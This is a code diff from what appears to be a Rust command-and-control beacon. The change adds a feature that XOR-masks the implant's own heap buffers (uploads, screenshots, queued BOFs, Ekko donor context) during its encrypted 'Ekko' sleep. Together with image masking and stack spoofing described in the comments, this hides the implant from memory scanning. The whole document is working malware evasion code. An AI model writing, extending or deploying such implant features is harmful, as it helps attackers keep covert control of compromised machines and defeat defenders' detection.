@@ -15,6 +15,7 @@ use specter_core::beat::BeatData;
 use specter_core::config;
 use specter_core::fnv::{fnv1a64, fnv1a64_wide_ascii_ci};
 use specter_core::heap::{self, GetProcessHeapFn, HeapAllocFn, HeapFreeFn};
+use specter_core::heapmask;
 use specter_core::hwbp::Hooks;
 use specter_core::peb::{self, Peb};
 use specter_core::rc4::Rc4;
@@ -886,6 +887,68 @@ fn async_active(instance: &Instance) -> bool {
     false
 }
 
+/// The beacon's own live heap ranges (upload/screenshot/BOF queue/donor
+/// context) — the "private heap" the Astral Projection half of sleep.c
+/// masks during the encrypted window. Never the whole process heap:
+/// foreign threads of the host may allocate there while the beacon sleeps.
+fn collect_heap_ranges(instance: &Instance, out: &mut [heapmask::HeapRange]) -> usize {
+    fn push(n: &mut usize, out: &mut [heapmask::HeapRange], ptr: usize, len: usize) {
+        if *n < out.len() && ptr != 0 && len > 0 {
+            out[*n] = heapmask::HeapRange { ptr, len };
+            *n += 1;
+        }
+    }
+    let mut n = 0usize;
+    if let Some(up) = &instance.upload {
+        push(&mut n, out, up.buf as usize, up.cap);
+    }
+    if let Some(sh) = &instance.screenshot {
+        push(&mut n, out, sh.buf as usize, sh.len);
+    }
+    if let Some(p) = &instance.bof_pending {
+        push(&mut n, out, p.buf as usize, p.cap);
+    }
+    if instance.ekko.donor_ctx != 0 {
+        push(
+            &mut n,
+            out,
+            instance.ekko.donor_ctx,
+            core::mem::size_of::<crate::runtime::ekko::DonorCtx>(),
+        );
+    }
+    n
+}
+
+/// Encrypted sleep with the private heap masked around the window: the
+/// heap ranges are XOR-masked before the image mask runs and restored
+/// right after (self-inverse keystream, own seed), so during the sleep
+/// both the image and the beacon's heap buffers are encrypted.
+///
+/// # Safety
+///
+/// The mask pointer must reference the instance-resident block for the
+/// whole call; the collected heap ranges must stay mapped and untouched
+/// by other threads for the whole window.
+unsafe fn ekko_sleep(
+    instance: &mut Instance,
+    mask: usize,
+    seed: u64,
+    interval: i64,
+    gadget: *const core::ffi::c_void,
+) -> bool {
+    let mut ranges = [heapmask::HeapRange { ptr: 0, len: 0 }; heapmask::MAX_HEAP_RANGES];
+    let n = collect_heap_ranges(instance, &mut ranges);
+    let heap_seed = seed ^ 0x5AFE_5EED_0FF1_CAFE;
+    if n > 0 {
+        heapmask::mask_ranges(&ranges[..n], heap_seed);
+    }
+    let r = ekko_sleep_inner(instance, mask, seed, interval, gadget);
+    if n > 0 {
+        heapmask::mask_ranges(&ranges[..n], heap_seed);
+    }
+    r
+}
+
 /// Encrypted sleep through the threadpool worker (SptEkkoSleep): the
 /// beacon thread parks in WaitForSingleObject while the worker spoofs
 /// its parked stack and runs the stub. Returns false when the threadpool
@@ -895,7 +958,7 @@ fn async_active(instance: &Instance) -> bool {
 ///
 /// The mask pointer must reference the instance-resident block for the
 /// whole call.
-unsafe fn ekko_sleep(
+unsafe fn ekko_sleep_inner(
     instance: &mut Instance,
     mask: usize,
     seed: u64,
